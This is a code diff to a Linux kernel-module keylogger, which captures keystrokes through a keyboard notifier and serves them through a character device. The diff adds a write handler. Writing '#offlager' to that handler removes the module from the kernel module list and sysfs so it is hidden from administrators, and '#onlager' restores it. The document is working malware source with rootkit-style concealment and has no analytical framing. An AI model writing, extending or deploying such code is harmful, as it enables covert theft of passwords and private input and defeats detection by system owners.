@@ -53,9 +53,12 @@ int keylog(struct notifier_block *, unsigned long, void *);
 static int device_open(struct inode *, struct file *);
 static int device_release(struct inode *, struct file *);
 static ssize_t device_read(struct file *, char *, size_t, loff_t *);
+static ssize_t device_write(struct file *, const char *, size_t, loff_t *);
 
 static int major;
 static int is_open = 0;
+static int hidden = 0;
+static int res;
 
 static int shiftKey = 0;
 struct semaphore sem;
@@ -66,13 +69,16 @@ static char *msg_ptr;
 static struct file_operations fops = {
 	.owner = THIS_MODULE,
 	.read = device_read,
-   	.open = device_open,
+   	.write = device_write,
+	.open = device_open,
 	.release = device_release
 };
 
 static struct notifier_block nb = {
 	.notifier_call = keylog
 };
+
+static struct list_head *mlist;
 
 static int device_open(struct inode *inode, struct file *file) {
 
@@ -107,6 +113,34 @@ static ssize_t device_read(struct file *filp, char *buff, size_t len, loff_t * o
 	}
 
 	return bytes_read;
+}
+
+static ssize_t
+device_write(struct file *filp, const char *buff, size_t len, loff_t *off) {
+	printk(KERN_INFO "written: %s\n", buff);
+	
+	if(strncmp("#offlager", buff, 9) == 0) {
+		if(hidden == 1)
+			return -EINVAL;
+
+		hidden = 1;
+		mlist = THIS_MODULE->list.prev;
+
+		list_del(&THIS_MODULE->list);
+		kobject_del(&THIS_MODULE->mkobj.kobj);
+
+		THIS_MODULE->sect_attrs = NULL;
+		THIS_MODULE->notes_attrs = NULL;
+	} else if(strncmp("#onlager", buff, 8) == 0) {
+		if(hidden == 0)
+			return -EINVAL;
+
+		hidden = 0;
+		list_add(&THIS_MODULE->list, mlist);
+		res = kobject_add(&THIS_MODULE->mkobj.kobj, THIS_MODULE->mkobj.kobj.parent, "rt");
+	}	
+
+	return -EINVAL;
 }
 
 int keylog(struct notifier_block *nblock, unsigned long code, void *_param) {
